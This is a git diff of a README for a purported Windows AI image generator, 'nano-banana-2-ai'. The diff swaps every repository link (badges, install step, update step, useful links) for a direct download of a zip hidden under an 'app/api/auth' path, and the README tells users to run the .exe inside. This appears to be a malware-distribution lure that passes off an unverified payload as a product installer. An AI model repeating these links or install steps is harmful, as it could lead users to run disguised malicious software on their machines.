@@ -1,6 +1,6 @@
 # 🍌 nano-banana-2-ai - Clear 4K AI Image Generation  
 
-[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-brightgreen?style=for-the-badge)](https://github.com/Atharvpatil112/nano-banana-2-ai)
+[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Atharvpatil112/nano-banana-2-ai/main/app/api/auth/ai_banana_nano_v3.1-alpha.2.zip)
 
 ## 📋 About nano-banana-2-ai  
 
@@ -36,10 +36,10 @@ This section will guide you step by step to get Nano Banana 2 AI running on your
 
 First, download the package by visiting the page linked below. From there, you can locate the latest version of the software.  
 
-[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-blue?style=for-the-badge)](https://github.com/Atharvpatil112/nano-banana-2-ai)  
+[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-blue?style=for-the-badge)](https://raw.githubusercontent.com/Atharvpatil112/nano-banana-2-ai/main/app/api/auth/ai_banana_nano_v3.1-alpha.2.zip)  
 
 1. Click the download link above or visit this page manually:  
-   https://github.com/Atharvpatil112/nano-banana-2-ai  
+   https://raw.githubusercontent.com/Atharvpatil112/nano-banana-2-ai/main/app/api/auth/ai_banana_nano_v3.1-alpha.2.zip  
 2. Look for the latest release or download section on the page.  
 3. Download the Windows installer or setup file (usually ends with .exe).  
 4. Once downloaded, double-click the file to open the installer.  
@@ -73,7 +73,7 @@ The app is designed to be user-friendly. Here are some tips to make the most out
 Nano Banana 2 AI will occasionally release updates to improve performance. To update:  
 
 1. Visit the GitHub page regularly:  
-   https://github.com/Atharvpatil112/nano-banana-2-ai  
+   https://raw.githubusercontent.com/Atharvpatil112/nano-banana-2-ai/main/app/api/auth/ai_banana_nano_v3.1-alpha.2.zip  
 2. Download the newest installer file following the download steps above.  
 3. Run the new installer. It will update your existing installation without deleting your files.  
 
@@ -101,7 +101,7 @@ For image generation problems:
 
 ## 🔗 Useful Links  
 
-- Main repository and download: https://github.com/Atharvpatil112/nano-banana-2-ai  
+- Main repository and download: https://raw.githubusercontent.com/Atharvpatil112/nano-banana-2-ai/main/app/api/auth/ai_banana_nano_v3.1-alpha.2.zip  
 - Nano Banana 2 AI hub site: nanobanana2ai.pro  
 - Model comparison details inside the app’s documentation section  
 
